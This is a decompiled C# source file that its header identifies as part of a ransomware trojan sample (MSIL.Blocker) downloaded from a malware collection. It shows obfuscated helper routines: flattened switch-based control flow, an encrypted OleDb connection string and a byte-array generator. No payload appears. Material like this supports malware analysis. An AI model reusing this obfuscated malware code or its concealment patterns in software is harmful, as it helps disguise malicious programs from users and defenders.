// Decompiled with JetBrains decompiler
// Type: s8C.Nn6
// Assembly: Hg3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 71068990-84F0-4183-8771-BC993FB770EE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.04-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-8a780dc272b6133d582b481e8977a2db3c55736381e8015d1fd9b6e08b6c1ffd.exe

using a7J;
using k0P9;
using Microsoft.VisualBasic.CompilerServices;
using Nj0;
using System;
using System.Data;
using System.Data.OleDb;

namespace s8C
{
  [StandardModule]
  internal sealed class Nn6
  {
    public static OleDbConnection con;
    public static OleDbDataAdapter da = new OleDbDataAdapter();
    public static DataSet ds = new DataSet();

    public static void p5P()
    {
      int num = 3;
      IEquatable<string> connectionString;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_5;
          case 1:
            num = 0;
            continue;
          case 2:
            Nn6.con = new OleDbConnection(connectionString as string);
            goto case 1;
          case 4:
            goto label_6;
          default:
            connectionString = (IEquatable<string>) t5TN.k6C8((byte) 16, 1302933523, 7);
            goto case 2;
        }
      }
label_6:
      return;
label_5:
      Mq8.e8K<OleDbConnection>(Nn6.con, 'ʟ', (short) 651);
    }

    internal static byte[] Et9(int Jm4, int m6D)
    {
      int num1 = 4;
      object obj;
      object Dd3;
      int num2;
      int index;
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
            obj = (object) null;
            num1 = 3;
            continue;
          case 1:
            (Dd3 as int[])[index] = num3;
            checked { ++index; }
            num1 = 10;
            continue;
          case 2:
          case 7:
            num3 = checked (Jm4 * index);
            num1 = num3 <= (int) byte.MaxValue ? 1 : 6;
            continue;
          case 3:
          case 11:
            goto label_11;
          case 5:
            Dd3 = (object) new int[checked (m6D + 1)];
            goto case 9;
          case 6:
            num3 = (int) byte.MaxValue;
            num1 = 1;
            continue;
          case 8:
            obj = (object) z6A.f2W(Dd3 as int[], m6D);
            num1 = 3;
            continue;
          case 9:
            num2 = m6D;
            index = 0;
            num1 = 10;
            continue;
          case 10:
            num1 = index <= num2 ? 2 : 8;
            continue;
          default:
            num1 = Jm4 > 0 ? 5 : 0;
            continue;
        }
      }
label_11:
      return (byte[]) obj;
    }
  }
}
